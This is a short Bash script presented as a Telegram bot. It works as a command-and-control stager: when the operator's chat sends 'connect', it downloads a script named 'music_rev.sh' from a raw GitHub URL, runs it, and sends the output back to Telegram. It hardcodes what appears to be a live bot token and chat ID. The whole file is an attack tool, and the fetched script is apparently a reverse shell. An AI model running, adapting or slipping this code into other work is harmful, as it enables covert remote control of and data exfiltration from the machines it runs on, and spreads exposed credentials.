#!/usr/bin/env bash
# commamnder.sh — Pure Bash Telegram bot (no Node.js, no jq)
# Requires: curl only

set -euo pipefail

################ CONFIG ################
TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"
HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
########################################

API="https://api.telegram.org/bot${TOKEN}"

send_msg() {
  local text="$1"
  curl -s -X POST "${API}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    --data-urlencode text="$text" >/dev/null
}

send_file() {
  local file="$1"
  curl -s -X POST "${API}/sendDocument" \
    -F chat_id="${CHAT_ID}" \
    -F document=@"$file" >/dev/null
}

# parser: extracts update_id, chat_id, and text
parse_updates_bash() {
  local json="$1"
  echo "$json" | grep -oE '{[^}]*}' | while read -r obj; do
    local UPDATE_ID CHAT TEXT
    UPDATE_ID=$(echo "$obj" | grep -Po '"update_id":\K[0-9]+' || true)
    CHAT=$(echo "$obj" | grep -Po '"chat":\{"id":\K-?[0-9]+' || true)
    TEXT=$(echo "$obj" | grep -Po '"text":"\K([^"]*)' | sed 's/\\n/ /g' || true)

    if [ -n "$UPDATE_ID" ] && [ -n "$CHAT" ]; then
      echo "${UPDATE_ID}|${CHAT}|${TEXT}"
    fi
  done
}

# notify on startup
send_msg "✅ Bot is online and ready."

OFFSET=0
while true; do
  UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")

  while IFS= read -r line; do
    [ -z "$line" ] && continue
    IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"

    OFFSET=$((UPDATE_ID+1))

    # only react to your chat
    if [ "$FROM_ID" != "$CHAT_ID" ]; then
      continue
    fi

    case "$TEXT" in
      connect)
        OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"

        if [ -z "$OUTPUT" ]; then
          send_msg "✅ Command executed successfully (no output)."
        else
          if [ ${#OUTPUT} -le 3500 ]; then
            send_msg "✅ Command output:\n$OUTPUT"
          else
            TMP="$(mktemp /tmp/out.XXXXXX)"
            printf "%s\n" "$OUTPUT" > "$TMP"
            send_file "$TMP"
            rm -f "$TMP"
          fi
        fi
        ;;
      *)
        # ignore unknown text
        ;;
    esac
  done < <(parse_updates_bash "$UPDATES")
done

